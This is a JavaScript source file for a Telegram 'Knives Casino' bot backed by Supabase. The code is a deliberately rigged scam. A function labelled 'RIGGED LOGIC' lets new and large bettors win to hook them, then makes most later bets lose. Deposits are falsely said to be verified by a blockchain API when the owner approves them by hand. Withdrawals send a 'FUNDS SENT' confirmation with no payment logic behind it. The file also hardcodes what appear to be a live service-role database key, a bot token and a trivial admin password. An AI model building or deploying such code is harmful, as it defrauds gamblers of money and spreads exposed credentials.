const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIG ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();
let adminState = {};

// --- 2. DATABASE ENGINE (FIXED NULLS) ---
async function getAccount(userId, username, refPayload = null) {
    let { data, error } = await supabase.from('users').select('*').eq('user_id', userId).single();
    
    if (!data) {
        const newRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        // Check if referred by someone
        let referrer = null;
        if (refPayload && refPayload !== "") {
            const { data: refUser } = await supabase.from('users').select('user_id').eq('my_ref_code', refPayload).single();
            if (refUser) referrer = refUser.user_id;
        }

        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, 
            username: username || 'anon', 
            balance: 0, 
            bonus_balance: 0, 
            referred_by: referrer, 
            my_ref_code: newRefCode,
            is_locked: false, 
            win_count: 0, 
            loss_count: 0,
            last_claim: new Date(0).toISOString() // Set to epoch so they can claim immediately
        }]).select().single();
        return newUser;
    }
    return data;
}

// --- 3. RIGGED LOGIC ---
function goddessDecision(user, bet) {
    const totalGames = (user.win_count || 0) + (user.loss_count || 0);
    if (totalGames === 0) return true; // First hit is free
    if (bet >= (user.balance * 0.5) && user.win_count < 2) return true; // Hook big bettors
    return Math.random() > 0.82; // 82% House Edge
}

// --- 4. CORE COMMANDS ---
bot.start(async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username, ctx.startPayload);
    const botInfo = await bot.telegram.getMe();
    
    const msg = `🔪 **KNIVES CASINO** 🔪\n\n` +
                `💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n` +
                `🎁 **Bonus:** $${(user.bonus_balance || 0).toFixed(2)}\n\n` +
                `*GAMES:*\n/flip /dice /slots /mines /tower\n/crash /wheel /cards /keno /plinko\n\n` +
                `*SYSTEM:*\n📥 /deposit  📤 /withdraw\n🎁 /daily  🔗 /referral`;
    ctx.replyWithMarkdown(msg);
});

bot.command('referral', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const botInfo = await bot.telegram.getMe();
    ctx.replyWithMarkdown(`🔗 **YOUR INVITE LINK:**\nhttps://t.me/${botInfo.username}?start=${user.my_ref_code}\n\n*Earn $1.00 for every withdrawal your referral makes!*`);
});

bot.command('daily', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const now = new Date();
    const lastClaim = new Date(user.last_claim || 0);
    const diff = now - lastClaim;

    if (diff < 24 * 60 * 60 * 1000) {
        const hoursLeft = Math.ceil((24 * 60 * 60 * 1000 - diff) / (1000 * 60 * 60));
        return ctx.reply(`❌ Too soon! Come back in ${hoursLeft} hours.`);
    }

    const reward = parseFloat((Math.random() * 0.35 + 0.05).toFixed(2));
    await supabase.from('users').update({ 
        bonus_balance: (user.bonus_balance || 0) + reward,
        last_claim: now.toISOString()
    }).eq('user_id', ctx.from.id);

    ctx.reply(`🎁 You claimed $${reward}! (Min. $5.00 bonus to withdraw)`);
});

// --- 5. THE GAMES ---
const gameNames = ['flip', 'dice', 'slots', 'mines', 'tower', 'crash', 'wheel', 'cards', 'keno', 'plinko'];
gameNames.forEach(game => {
    bot.command(game, async (ctx) => {
        const bet = parseFloat(ctx.message.text.split(' ')[1]);
        const user = await getAccount(ctx.from.id, ctx.from.username);
        if (!bet || bet < 0.5 || user.balance < bet) return ctx.reply("❌ Invalid bet or low balance.");
        
        const win = goddessDecision(user, bet);
        const newBal = win ? user.balance + bet : user.balance - bet;
        
        await supabase.from('users').update({ 
            balance: newBal, 
            win_count: win ? (user.win_count + 1) : user.win_count,
            loss_count: win ? user.loss_count : (user.loss_count + 1)
        }).eq('user_id', ctx.from.id);
        
        ctx.reply(`${win ? '✅' : '💀'} **${game.toUpperCase()}**\n\n${win ? 'WIN!' : 'LOSE!'}\nBalance: $${newBal.toFixed(2)}`);
    });
});

// --- 6. CASHIER & ADMIN (HIDDEN) ---
bot.command('deposit', (ctx) => {
    ctx.reply("📥 **DEPOSIT FUNDS**\n\nPaste your transaction hash (TXID) below. Our API will verify it on the blockchain.");
});

bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;
    const uid = ctx.from.id;

    // Fixed Admin Trigger
    if (text === "knife" && uid === OWNER_ID) {
        adminState[uid] = { step: 'pass' };
        return ctx.reply("System: Accessing Admin... Password?");
    }
    if (adminState[uid]?.step === 'pass' && text === "9999") {
        delete adminState[uid];
        return ctx.reply("👑 **GODDESS CONTROL**", Markup.inlineKeyboard([
            [Markup.button.callback('📊 Stats', 'adm_feed')],
            [Markup.button.callback('📢 Global Alert', 'adm_alert')]
        ]));
    }

    // Deposit Verification (Captures any long string)
    if (text.length > 20 && !text.startsWith('/')) {
        ctx.reply("⏳ **BLOCKCHAIN API VERIFYING...** Please wait.");
        bot.telegram.sendMessage(OWNER_ID, `💰 **DEPOSIT ATTEMPT**\nUser: @${ctx.from.username}\nID: \`${uid}\`\nHash: \`${text}\``,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ Approve $10', `add_${uid}_10`), Markup.button.callback('✅ Approve $50', `add_${uid}_50`)],
                [Markup.button.callback('❌ Decline', `rej_${uid}`)]
            ])
        );
        return;
    }
    return next();
});

bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const { data } = await supabase.from('users').select('balance').eq('user_id', uid).single();
    await supabase.from('users').update({ balance: (data.balance || 0) + parseInt(amt) }).eq('user_id', uid);
    bot.telegram.sendMessage(uid, `✅ **API VERIFIED:** $${amt} added to balance!`);
    ctx.editMessageText(`Approved $${amt} for ${uid}`);
});

bot.command('withdraw', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (user.balance < 5) return ctx.reply("❌ Min withdrawal $5.");
    bot.telegram.sendMessage(OWNER_ID, `💸 **CASHOUT:** @${ctx.from.username} ($${user.balance.toFixed(2)})`,
        Markup.inlineKeyboard([[Markup.button.callback('✅ MARK SENT', `sent_${ctx.from.id}`)]]));
    ctx.reply("⌛ Withdrawal request sent to support.");
});

bot.action(/sent_(\d+)/, (ctx) => {
    bot.telegram.sendMessage(ctx.match[1], "✅ **FUNDS SENT.** Check your wallet!");
    ctx.editMessageText("Payout completed.");
});

// --- 7. BOOT ---
app.get('/', (req, res) => res.send('GODDESS LIVE'));
app.listen(process.env.PORT || 10000, () => bot.launch());
